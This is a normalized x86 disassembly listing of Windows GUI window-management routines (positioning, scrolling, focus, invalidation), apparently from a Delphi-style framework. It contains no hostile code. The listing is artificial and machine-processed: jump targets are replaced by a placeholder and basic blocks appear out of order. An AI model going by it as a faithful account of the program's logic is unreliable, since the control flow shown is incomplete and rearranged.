mov eax ebx
call sub_435c5c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44b71c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_435c5c
test eax eax
jne r-xdata
sub_43abec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43a9d4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_435c5c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44b71c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_435c5c
test eax eax
jne r-xdata
sub_43ac48
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44b71c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_435c5c
mov [ esi + 0xc ] eax
sub_43ac7c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4340e4
mov eax ebx
mov si 0xffd0
call sub_4032f4
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_434430
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ad54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_437fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_437f84
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4032f4
inc edi
dec ebx
jne r-xdata
sub_43ad9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437b28
xor eax eax
push ebp
push sub_43ae3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ad54
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4346ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae41
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43ae48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_437b50
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_437f84
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43af38
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413a50
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4138e4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413a70
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4139f4
call sub_43b290
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4139f4
call sub_43b290
sub_43b010
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43af38
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43b070
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43b290
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43b290
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
test eax eax
jne r-xdata
sub_43b0d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b594
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_435c5c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
mov eax ebx
call sub_437fc0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_437f84
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_437f84
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43b198
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_434430
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43b1d0
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44b71c
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43b210
push ebx
mov ebx eax
mov eax ebx
call sub_44b71c
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_44f488
pop ebx
retn
mov eax ebx
call sub_44b744
mov eax ebx
call sub_43b290
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43b248
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43b26c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43b26c
sub_43b2a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_4125c0
mov eax edi
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_437f84
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43b338
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43b290
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43b370
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43b594
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4032f4
sub_43b42c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413a50
pop esi
pop ebx
retn
sub_43b450
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b42c
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4138e4
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413a70
sub_43b4c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43b594
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_435c5c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43b524
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43b588
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b58f
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4032f4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405508
sub_43b5a0
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4340e4
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43b658
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4139f4
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413898
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4032f4
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43b6b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43b7ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4032f4
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b7b5
mov eax [ ebp - 0x14 ]
call sub_4030f8
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413a50
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4139f4
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43b7c4
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43b6b8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43b7f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b71c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43b6b8
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43b6b8
mov edx eax
mov eax esi
call sub_44f388
sub_43b834
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43b87c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43af38
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_434d00
sub_43b8c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43b948
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43b594
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_437fc0
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43bd0a
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_437fc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43b8c4
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
